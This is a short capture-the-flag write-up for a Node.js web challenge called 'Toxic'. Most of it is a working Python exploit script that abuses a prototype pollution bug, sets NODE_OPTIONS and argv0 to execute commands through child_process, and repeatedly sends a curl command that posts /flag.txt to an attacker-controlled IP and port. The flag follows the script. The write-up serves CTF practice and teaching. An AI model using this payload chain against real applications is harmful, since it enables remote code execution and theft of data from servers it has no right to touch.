# Toxic Writeup

Toxic is a web challenge, it's supposed to be easy, you are given the `app.js` file and you need to get a RCE.

## The vuln

Read [this](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution) and [this](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce).

Congratz you can now exploit a prototype pollution, I don't know what was hard in that? The only additional thing you need to do is encrypt your payload. You need the key? WELP the key is randomly generated between 1 and 10 so just fix your key and try the request several time!

Here is the exploit script:

```Python

# There is a prototype pollution in decObjIn
# Plus `exec` will get us a RCE

from base64 import b64encode
import json
import requests

url = "http://10.1.27.134:13497/"
#url = "http://127.0.0.1:3030"
rev_ip = "10.1.11.16"
rev_port = "4444"

def xorNb(msg, key):
    return b64encode(bytes(
        map(
            lambda x: x ^ key,
            msg.encode()
        )
    )).decode()

def encObj(cmd,key):
    z = json.JSONEncoder()
    x = lambda k: xorNb(k, key)
    payload = {
        x('__proto__'):{
            x('shell'): x('/proc/self/exe'),
            x('argv0'): x("console.log(require('child_process').execSync('{}')).toString()//".format(cmd)),
            x("NODE_OPTIONS"): x("--require /proc/self/cmdline")
        }
    }
    return b64encode(z.encode(payload).encode()).decode()

def sendEncRequest(cmd, key):
    enc = encObj(cmd, key)
    requests.post(url, json={"json":enc})

while True:
    sendEncRequest('curl {}:{}/ -d @/flag.txt'.format(rev_ip, rev_port), 4) # We pray the key is 4

```

FLAG: `insec{j4v4scr1pt_w4s_4_g00d_id34_??}`
